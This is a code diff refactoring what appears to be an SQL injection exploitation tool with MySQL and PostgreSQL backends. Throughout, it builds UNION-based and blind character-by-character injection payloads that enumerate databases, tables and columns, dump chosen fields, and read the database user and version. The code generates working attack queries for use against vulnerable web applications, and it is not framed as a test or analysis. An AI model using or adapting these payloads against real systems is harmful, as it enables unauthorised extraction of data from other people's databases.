@@ -30,11 +30,9 @@ class DbmsMole():
                         "Error: Unknown column '(\d*)' in 'order clause'"
                     ]
     
-    @classmethod
     def injectable_field_finger(cls, query_columns, base):
         pass
     
-    @classmethod
     def dbms_check_query(cls, columns, injectable_field):
         pass
     
@@ -44,7 +42,7 @@ class DbmsMole():
         for i in string:
             output += hex(ord(i)).replace('0x', '')
         return '0x' + output
-
+    
     @classmethod
     def chr_join(cls, string):
         return '||'.join(map(lambda x: 'chr(' + str(ord(x)) + ')', string))
@@ -64,19 +62,185 @@ class DbmsMole():
                 return True
         return False
     
-    @classmethod
+    # Parses a "where condition", replacing strings within
+    # single quotes(') for their representation in the current DBMS.
     def parse_condition(self, condition):
         cond = condition.split("'")
         for i in range(len(cond)):
             if i % 2 == 1:
-                cond[i] = DbmsMole.to_string(cond[i])
+                cond[i] = self.to_string(cond[i])
         return ''.join(cond)
     
-    # Subclasses should implement this method to return a valid
+    # Subclasses MUST implement this method to return a valid
     # string conversion for data in this dbms.
-    @classmethod
-    def to_string(cls, data):
+    def to_string(self, data):
         pass
+    
+    # Subclasses MUST implementent this method so it returns a string
+    # which represents the concatenation of param fields.
+    def _concat_fields(self, fields):
+        pass
+        
+    def forge_blind_query(self, index, value, fields, table, where="1=1", offset=0):
+        return '{sep} and ' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + where + ' limit 1 offset '+str(offset) + '){end}'
+        
+    def forge_blind_count_query(self, operator, value, table, where="1=1"):
+        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
+
+    def forge_blind_len_query(self, operator, value, field, table, where="1=1", offset=0):
+        return '{sep} and ' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + where + ' limit 1 offset '+str(offset)+'){end}'
+        
+    def schema_count_query(self, columns, injectable_field):
+        return self.forge_query(columns, "count(*)", 
+               self._schemas_query_info()['table'], injectable_field, offset=0)
+    
+    def schema_query(self, columns, injectable_field, offset):
+        info = self._schemas_query_info()
+        return self.forge_query(columns, info['field'], 
+               info['table'], injectable_field, offset=offset)
+               
+    def table_count_query(self, db, columns, injectable_field):
+        info = self._tables_query_info(db)
+        return self.forge_query(columns, "count(*)", 
+                    info['table'], injectable_field,
+                    info['filter'],
+               )
+
+    def table_query(self, db, columns, injectable_field, offset):
+        info = self._tables_query_info(db)
+        return self.forge_query(columns, info['field'], 
+                    info['table'], injectable_field,
+                    info['filter'], offset=offset
+               )
+
+    def columns_count_query(self, db, table, columns, injectable_field):
+        info = self._columns_query_info(db, table)
+        return self.forge_query(columns, "count(*)", 
+                    info['table'], injectable_field,
+                    where=info['filter']
+               )
+
+    def columns_query(self, db, table, columns, injectable_field, offset):
+        info = self._columns_query_info(db, table)
+        return self.forge_query(columns, info['field'], 
+                    info['table'], injectable_field,
+                    where=info['filter'],
+                    offset=offset
+               )
+               
+    def fields_count_query(self, db, table, columns, injectable_field, where="1=1"):
+        info = self._fields_query_info([], db, table, where)
+        return self.forge_query(columns, "count(*)", 
+                    info['table'], injectable_field,
+                    where=info['filter']
+               )
+
+    def fields_query(self, db, table, fields, columns, injectable_field, offset, where="1=1"):
+        info = self._fields_query_info(fields, db, table, where)
+        return self.forge_query(columns, info['field'], 
+                    info['table'], injectable_field,
+                    where=info['filter'], 
+                    offset=offset
+               )
+               
+    def schema_blind_count_query(self, operator, value):
+        info = self._schemas_query_info()
+        return self.forge_blind_count_query(
+            operator, value, info['table']
+        )
+
+    def schema_blind_len_query(self, operator, value, offset, where="1=1"):
+        info = self._schemas_query_info()
+        return self.forge_blind_len_query(
+            operator, value, info['field'], info['table'], offset=offset, where=where
+        )
+
+    def schema_blind_data_query(self, index, value, offset, where="1=1"):
+        info = self._schemas_query_info()
+        return self.forge_blind_query(
+            index, value, info['field'], info['table'], offset=offset, where=where
+        )
+        
+    def table_blind_count_query(self, operator, value, db):
+        info = self._tables_query_info(db)
+        return self.forge_blind_count_query(
+            operator, value, info['table'], 
+            where=info['filter']
+        )
+
+    def table_blind_len_query(self, operator, value, db, offset):
+        info = self._tables_query_info(db)
+        return self.forge_blind_len_query(
+            operator, value, info['field'], 
+            info['table'], offset=offset, where=info['filter']
+        )
+
+    def table_blind_data_query(self, index, value, db, offset):
+        info = self._tables_query_info(db)
+        return self.forge_blind_query(
+            index, value, info['field'], info['table'], 
+            offset=offset, where=info['filter']
+        )
+        
+    def columns_blind_count_query(self, operator, value, db, table):
+        info = self._columns_query_info(db, table)
+        return self.forge_blind_count_query(
+            operator, value, info['table'], 
+            where=info['filter']
+        )
+
+    def columns_blind_len_query(self, operator, value, db, table, offset):
+        info = self._columns_query_info(db, table)
+        return self.forge_blind_len_query(
+            operator, value, info['field'], 
+            info['table'], offset=offset, 
+            where=info['filter']
+        )
+
+    def columns_blind_data_query(self, index, value, db, table, offset):
+        info = self._columns_query_info(db, table)
+        return self.forge_blind_query(
+            index, value, info['field'], info['table'], 
+            offset=offset, where=info['filter']
+        )
+        
+    def fields_blind_count_query(self, operator, value, db, table, where="1=1"):
+        info = self._fields_query_info([], db, table, where)
+        return self.forge_blind_count_query(
+            operator, value, info['table'], 
+            where=where
+        )
+
+    def fields_blind_len_query(self, operator, value, fields, db, table, offset, where="1=1"):
+        info = self._fields_query_info(fields, db, table, where)
+        return self.forge_blind_len_query(
+            operator, value, self._concat_fields(fields), 
+            info['table'], offset=offset, where=info['filter']
+        )
+
+    def fields_blind_data_query(self, index, value, fields, db, table, offset, where="1=1"):
+        info = self._fields_query_info(fields, db, table, where)
+        return self.forge_blind_query(
+            index, value, self._concat_fields(fields), 
+            info['table'], offset=offset, where=info['filter']
+        )
+        
+    def dbinfo_query(self, columns, injectable_field):
+        info = self._dbinfo_query_info()
+        return self.forge_query(columns, info['field'], 
+               info['table'], injectable_field, offset=0)
+
+    def dbinfo_blind_len_query(self, operator, value):
+        info = self._dbinfo_query_info()
+        return self.forge_blind_len_query(
+            operator, value, self._concat_fields(info['field'].split(',')), info['table']
+        )
+
+    def dbinfo_blind_data_query(self, index, value):
+        info = self._dbinfo_query_info()
+        return self.forge_blind_query(
+            index, value, self._concat_fields(info['field'].split(',')), info['table']
+        )
 
 class Mysql5Mole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -87,6 +251,42 @@ class Mysql5Mole(DbmsMole):
     @classmethod
     def to_string(cls, data):
         return DbmsMole.to_hex(data)
+    
+    def _schemas_query_info(self):
+        return {
+            'table' : 'information_schema.schemata',
+            'field' : 'schema_name'
+        }
+    
+    def _tables_query_info(self, db):
+        return {
+            'table' : 'information_schema.tables',
+            'field' : 'table_name',
+            'filter': "table_schema = '{db}'".format(db=db)
+        }
+    
+    def _columns_query_info(self, db, table):
+        return {
+            'table' : 'information_schema.columns',
+            'field' : 'column_name',
+            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=db, table=table)
+        }
+        
+    def _fields_query_info(self, fields, db, table, where):
+        return {
+            'table' : db + '.' + table,
+            'field' : ','.join(fields),
+            'filter': where
+        }
+        
+    def _dbinfo_query_info(self):
+        return {
+            'field' : 'user(),version(),database()', 
+            'table' : 'information_schema.schemata'
+        }
+    
+    def _concat_fields(self, fields):
+        return 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',' + ','.join(fields) + ')'
     
     @classmethod
     def injectable_field_finger(cls, query_columns, base):
@@ -124,21 +324,8 @@ class Mysql5Mole(DbmsMole):
     @classmethod
     def dbms_check_blind_query(cls):
         return '{sep} and 0 < (select length(@@version)) {end}'
-    
-    @classmethod
-    def forge_blind_query(cls, index, value, fields, table, where="1=1", offset=0):
-        return '{sep} and ' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + where + ' limit 1 offset '+str(offset) + '){end}'
-        
-    @classmethod
-    def forge_blind_count_query(cls, operator, value, table, where="1=1"):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
 
-    @classmethod
-    def forge_blind_len_query(cls, operator, value, field, table, where="1=1", offset=0):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + where + ' limit 1 offset '+str(offset)+'){end}'
-
-    @classmethod
-    def forge_query(cls, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(column_count)))
         query_list[injectable_field] = ("CONCAT(" +
@@ -150,170 +337,11 @@ class Mysql5Mole(DbmsMole):
                                             Mysql5Mole.out_delimiter +
                                         ")")
         query += ','.join(query_list)
-        query += " from " + table_name + " where " + Mysql5Mole.parse_condition(where) + \
+        query += " from " + table_name + " where " + self.parse_condition(where) + \
                  " limit 1 offset " + str(offset) + "{com}"
         return query
 
-    @classmethod
-    def schema_count_query(cls, columns, injectable_field):
-        return Mysql5Mole.forge_query(columns, "count(*)", 
-               "information_schema.schemata", injectable_field, offset=0)
-    
-    @classmethod
-    def schema_blind_count_query(cls, operator, value):
-        return Mysql5Mole.forge_blind_count_query(
-            operator, value, "information_schema.schemata"
-        )
-
-    @classmethod
-    def schema_blind_len_query(cls, operator, value, offset, where="1=1"):
-        return Mysql5Mole.forge_blind_len_query(
-            operator, value, "schema_name", "information_schema.schemata", offset=offset, where=where
-        )
-
-    @classmethod
-    def schema_blind_data_query(cls, index, value, offset, where="1=1"):
-        return Mysql5Mole.forge_blind_query(
-            index, value, "schema_name", "information_schema.schemata", offset=offset, where=where
-        )
-    
-    @classmethod
-    def schema_query(cls, columns, injectable_field, offset):
-        return Mysql5Mole.forge_query(columns, "schema_name", 
-               "information_schema.schemata", injectable_field, offset=offset)
-
-    @classmethod
-    def table_count_query(cls, db, columns, injectable_field):
-        return Mysql5Mole.forge_query(columns, "count(*)", 
-                    "information_schema.tables", injectable_field,
-                    "table_schema = " + DbmsMole.to_hex(db),
-               )
-
-    @classmethod
-    def table_query(cls, db, columns, injectable_field, offset):
-        return Mysql5Mole.forge_query(columns, "table_name", 
-                    "information_schema.tables", injectable_field,
-                    "table_schema = " + DbmsMole.to_hex(db), offset=offset
-               )
-
-    @classmethod
-    def table_blind_count_query(cls, operator, value, db):
-        return Mysql5Mole.forge_blind_count_query(
-            operator, value, "information_schema.tables", 
-            where="table_schema = " + DbmsMole.to_hex(db)
-        )
-
-    @classmethod
-    def table_blind_len_query(cls, operator, value, db, offset):
-        return Mysql5Mole.forge_blind_len_query(
-            operator, value, "table_name", 
-            "information_schema.tables", offset=offset, where="table_schema = " + DbmsMole.to_hex(db)
-        )
-
-    @classmethod
-    def table_blind_data_query(cls, index, value, db, offset):
-        return Mysql5Mole.forge_blind_query(
-            index, value, "table_name", "information_schema.tables", 
-            offset=offset, where="table_schema = " + DbmsMole.to_hex(db)
-        )
-
-    @classmethod
-    def columns_count_query(cls, db, table, columns, injectable_field):
-        return Mysql5Mole.forge_query(columns, "count(*)", 
-                    "information_schema.columns", injectable_field,
-                    where="table_schema = " + DbmsMole.to_hex(db) + 
-                    " and table_name = " + DbmsMole.to_hex(table)
-               )
-
-    @classmethod
-    def columns_query(cls, db, table, columns, injectable_field, offset):
-        return Mysql5Mole.forge_query(columns, "column_name", 
-                    "information_schema.columns", injectable_field,
-                    "table_schema = " + DbmsMole.to_hex(db) + 
-                    " and table_name = " + DbmsMole.to_hex(table), 
-                    offset
-               )
-               
-    @classmethod
-    def columns_blind_count_query(cls, operator, value, db, table):
-        return Mysql5Mole.forge_blind_count_query(
-            operator, value, "information_schema.columns", 
-            where="table_schema = " + DbmsMole.to_hex(db) + 
-            " and table_name = " + DbmsMole.to_hex(table)
-        )
-
-    @classmethod
-    def columns_blind_len_query(cls, operator, value, db, table, offset):
-        return Mysql5Mole.forge_blind_len_query(
-            operator, value, "column_name", 
-            "information_schema.columns", offset=offset, 
-            where="table_schema = " + DbmsMole.to_hex(db) + 
-            " and table_name = " + DbmsMole.to_hex(table)
-        )
-
-    @classmethod
-    def columns_blind_data_query(cls, index, value, db, table, offset):
-        return Mysql5Mole.forge_blind_query(
-            index, value, "column_name", "information_schema.columns", 
-            offset=offset, where="table_schema = " + DbmsMole.to_hex(db) + 
-            " and table_name = " + DbmsMole.to_hex(table)
-        )
-
-    @classmethod
-    def fields_count_query(cls, db, table, columns, injectable_field, where="1=1"):
-        return Mysql5Mole.forge_query(columns, "count(*)", 
-                    db + "." + table, injectable_field,
-                    where=where
-               )
-
-    @classmethod
-    def fields_query(cls, db, table, fields, columns, injectable_field, offset, where="1=1"):
-        return Mysql5Mole.forge_query(columns, ",".join(fields), 
-                    db + "." + table, injectable_field,
-                    where=where, 
-                    offset=offset
-               )
-               
-    @classmethod
-    def fields_blind_count_query(cls, operator, value, table, where="1=1"):
-        return Mysql5Mole.forge_blind_count_query(
-            operator, value, table, 
-            where=where
-        )
-
-    @classmethod
-    def fields_blind_len_query(cls, operator, value, fields, table, offset, where="1=1"):
-        return Mysql5Mole.forge_blind_len_query(
-            operator, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',' + ','.join(fields) + ')', 
-            table, offset=offset, where=where
-        )
-
-    @classmethod
-    def fields_blind_data_query(cls, index, value, fields, table, offset, where="1=1"):
-        return Mysql5Mole.forge_blind_query(
-            index, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',' + ','.join(fields) + ')', 
-            table, offset=offset, where=where
-        )
-
-    @classmethod
-    def dbinfo_query(cls, columns, injectable_field):
-        return Mysql5Mole.forge_query(columns, "user(),version(),database()", 
-               "information_schema.schemata", injectable_field, offset=0)
-
-    @classmethod
-    def dbinfo_blind_len_query(cls, operator, value):
-        return Mysql5Mole.forge_blind_len_query(
-            operator, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version(),database())', "information_schema.schemata"
-        )
-
-    @classmethod
-    def dbinfo_blind_data_query(cls, index, value):
-        return Mysql5Mole.forge_blind_query(
-            index, value, 'CONCAT_WS(' + Mysql5Mole.inner_delimiter + ',user(),version(),databse())', "information_schema.schemata"
-        )
-
-    @classmethod
-    def parse_results(cls, url_data):
+    def parse_results(self, url_data):
         data_list = url_data.split(Mysql5Mole.out_delimiter_result)
         if len(data_list) < 3:
             return None
@@ -334,10 +362,42 @@ class PostgresMole(DbmsMole):
     inner_delimiter_result = "><"
     inner_delimiter = DbmsMole.chr_join(inner_delimiter_result)
     
-    @classmethod
-    def to_string(cls, data):
+    def to_string(self, data):
         return DbmsMole.chr_join(data)
         
+    def _schemas_query_info(self):
+        return {
+            'table' : 'pg_catalog.pg_database',
+            'field' : 'datname'
+        }
+    
+    def _tables_query_info(self, db):
+        return {
+            'table' : 'information_schema.tables',
+            'field' : 'table_name',
+            'filter': "table_schema = '{db}'".format(db=self._db_name(db))
+        }
+    
+    def _columns_query_info(self, db, table):
+        return {
+            'table' : 'information_schema.columns',
+            'field' : 'column_name',
+            'filter': "table_schema = '{db}' and table_name = '{table}'".format(db=self._db_name(db), table=table)
+        }
+        
+    def _fields_query_info(self, fields, db, table, where):
+        return {
+            'table' : table,
+            'field' : ','.join(fields),
+            'filter': where
+        }
+        
+    def _dbinfo_query_info(self):
+        return {
+            'field' : 'getpgusername(),version(),current_database()', 
+            'table' : 'information_schema.schemata'
+        }
+
     @classmethod
     def dbms_name(cls):
         return 'Postgres'
@@ -350,8 +410,7 @@ class PostgresMole(DbmsMole):
     def dbms_check_blind_query(cls):
         return '{sep} and 0 < (select length(getpgusername())) {end}'
     
-    @classmethod
-    def forge_query(cls, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
+    def forge_query(self, column_count, fields, table_name, injectable_field, where = "1=1", offset = 0):
         query = "{sep}{par} and 1 = 0 UNION ALL SELECT "
         query_list = []
         for i in range(column_count):
@@ -361,7 +420,7 @@ class PostgresMole(DbmsMole):
                                             ")||" + PostgresMole.out_delimiter + ")"
                                         )
         query += ','.join(query_list)
-        query += " from " + table_name + " where " + PostgresMole.parse_condition(where) + \
+        query += " from " + table_name + " where " + self.parse_condition(where) + \
                  " limit 1 offset " + str(offset) + "{com}"
         return query
     
@@ -386,192 +445,21 @@ class PostgresMole(DbmsMole):
 
     @classmethod
     def dbms_check_query(cls, columns, injectable_field):
-        return PostgresMole.forge_query(
+        return PostgresMole().forge_query(
             columns, 'getpgusername()', 'pg_user', injectable_field
         )
-    
-    @classmethod
-    def schema_count_query(cls, columns, injectable_field):
-        return PostgresMole.forge_query(columns, "count(*)", 
-               "pg_catalog.pg_database", injectable_field, offset=0)
-               
-    @classmethod
-    def schema_query(cls, columns, injectable_field, offset):
-        return PostgresMole.forge_query(columns, "datname", 
-               "pg_catalog.pg_database", injectable_field, offset=offset)
-               
-    @classmethod
-    def table_count_query(cls, db, columns, injectable_field):
-        return PostgresMole.forge_query(columns, "count(*)", 
-                    "information_schema.tables", injectable_field,
-                    "table_schema = " + DbmsMole.chr_join(cls._db_name(db)),
-               )
 
-    @classmethod
-    def table_query(cls, db, columns, injectable_field, offset):
-        return PostgresMole.forge_query(columns, "table_name", 
-                    "information_schema.tables", injectable_field,
-                    "table_schema = " + DbmsMole.chr_join(cls._db_name(db)), offset=offset
-               )
+    def _concat_fields(self, fields):
+        return ('||' + PostgresMole.inner_delimiter + '||').join(fields)
 
-    @classmethod
-    def columns_count_query(cls, db, table, columns, injectable_field):
-        return PostgresMole.forge_query(columns, "count(*)", 
-                    "information_schema.columns", injectable_field,
-                    where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
-                    " and table_name = " + DbmsMole.chr_join(table)
-               )
 
-    @classmethod
-    def columns_query(cls, db, table, columns, injectable_field, offset):
-        return PostgresMole.forge_query(columns, "column_name", 
-                    "information_schema.columns", injectable_field,
-                    "table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
-                    " and table_name = " + DbmsMole.chr_join(table), 
-                    offset
-               )
-
-    @classmethod
-    def fields_count_query(cls, db, table, columns, injectable_field, where="1=1"):
-        return PostgresMole.forge_query(columns, "count(*)", 
-                    table, injectable_field, where=where
-               )
-
-    @classmethod
-    def fields_query(cls, db, table, fields, columns, injectable_field, offset, where="1=1"):
-        return PostgresMole.forge_query(columns, ",".join(fields), 
-                    table, injectable_field,
-                    where=where,  offset=offset
-               )
-
-    @classmethod
-    def forge_blind_query(cls, index, value, fields, table, where="1=1", offset=0):
-        return '{sep} and ' + str(value) + ' < (select ascii(substring('+fields+', '+str(index)+', 1)) from ' + table+' where ' + where + ' limit 1 offset '+str(offset) + '){end}'
-        
-    @classmethod
-    def forge_blind_count_query(cls, operator, value, table, where="1=1"):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select count(*) from '+table+' where '+where+'){end}'
-
-    @classmethod
-    def forge_blind_len_query(cls, operator, value, field, table, where="1=1", offset=0):
-        return '{sep} and ' + str(value) + ' ' + operator + ' (select length('+field+') from '+table+' where ' + where + ' limit 1 offset '+str(offset)+'){end}'
-
-    
-    @classmethod
-    def schema_blind_count_query(cls, operator, value):
-        return PostgresMole.forge_blind_count_query(
-            operator, value, "pg_catalog.pg_database"
-        )
-
-    @classmethod
-    def schema_blind_len_query(cls, operator, value, offset, where="1=1"):
-        return PostgresMole.forge_blind_len_query(
-            operator, value, "datname", "pg_catalog.pg_database", offset=offset, where=where
-        )
-
-    @classmethod
-    def schema_blind_data_query(cls, index, value, offset, where="1=1"):
-        return PostgresMole.forge_blind_query(
-            index, value, "datname", "pg_catalog.pg_database", offset=offset, where=where
-        )
-
-    @classmethod
-    def table_blind_count_query(cls, operator, value, db):
-        return PostgresMole.forge_blind_count_query(
-            operator, value, "information_schema.tables", 
-            where="table_schema = " + DbmsMole.chr_join(cls._db_name(db))
-        )
-
-    @classmethod
-    def table_blind_len_query(cls, operator, value, db, offset):
-        return PostgresMole.forge_blind_len_query(
-            operator, value, "table_name", 
-            "information_schema.tables", offset=offset, where="table_schema = " + DbmsMole.chr_join(cls._db_name(db))
-        )
-
-    @classmethod
-    def table_blind_data_query(cls, index, value, db, offset):
-        return PostgresMole.forge_blind_query(
-            index, value, "table_name", "information_schema.tables", 
-            offset=offset, where="table_schema = " + DbmsMole.chr_join(cls._db_name(db))
-        )
-
-    @classmethod
-    def columns_blind_count_query(cls, operator, value, db, table):
-        return PostgresMole.forge_blind_count_query(
-            operator, value, "information_schema.columns", 
-            where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
-            " and table_name = " + DbmsMole.chr_join(table)
-        )
-
-    @classmethod
-    def columns_blind_len_query(cls, operator, value, db, table, offset):
-        return PostgresMole.forge_blind_len_query(
-            operator, value, "column_name", 
-            "information_schema.columns", offset=offset, 
-            where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
-            " and table_name = " + DbmsMole.chr_join(table)
-        )
-
-    @classmethod
-    def columns_blind_data_query(cls, index, value, db, table, offset):
-        return PostgresMole.forge_blind_query(
-            index, value, "column_name", "information_schema.columns", 
-            offset=offset, where="table_schema = " + DbmsMole.chr_join(cls._db_name(db)) + 
-            " and table_name = " + DbmsMole.chr_join(table)
-        )
-
-    @classmethod
-    def fields_blind_count_query(cls, operator, value, table, where="1=1"):
-        return PostgresMole.forge_blind_count_query(
-            operator, value, table, 
-            where=where
-        )
-
-    @classmethod
-    def fields_blind_len_query(cls, operator, value, fields, table, offset, where="1=1"):
-        return Mysql5Mole.forge_blind_len_query(
-            operator, value, ('||' + PostgresMole.inner_delimiter + '||').join(fields), 
-            table, offset=offset, where=where
-        )
-
-    @classmethod
-    def fields_blind_data_query(cls, index, value, fields, table, offset, where="1=1"):
-        return PostgresMole.forge_blind_query(
-            index, value, ('||' + PostgresMole.inner_delimiter + '||').join(fields), 
-            table, offset=offset, where=where
-        )
-
-    @classmethod
-    def dbinfo_query(cls, columns, injectable_field):
-        return PostgresMole.forge_query(columns, "getpgusername(),version(),current_database()", 
-               "information_schema.tables", injectable_field, offset=0)
-
-    @classmethod
-    def dbinfo_blind_len_query(cls, operator, value):
-        return PostgresMole.forge_blind_len_query(
-            operator, value, 
-            '(' + ('||' + PostgresMole.inner_delimiter + '||').join(['getpgusername()', 'version()', 'current_database()']) + ')', 
-            "information_schema.schemata"
-        )
-
-    @classmethod
-    def dbinfo_blind_data_query(cls, index, value):
-        return PostgresMole.forge_blind_query(
-            index, value, 
-            '(' + ('||' + PostgresMole.inner_delimiter + '||').join(['getpgusername()', 'version()', 'current_database()']) + ')', 
-            "information_schema.schemata"
-        )
-
-    @classmethod
-    def _db_name(cls, db):
+    def _db_name(self, db):
         if db.startswith('postgres'):
             return 'pg_catalog'
         else:
             return 'public'
 
-    @classmethod
-    def parse_results(cls, url_data):
+    def parse_results(self, url_data):
         data_list = url_data.split(PostgresMole.out_delimiter_result)
         if len(data_list) < 3:
             return None
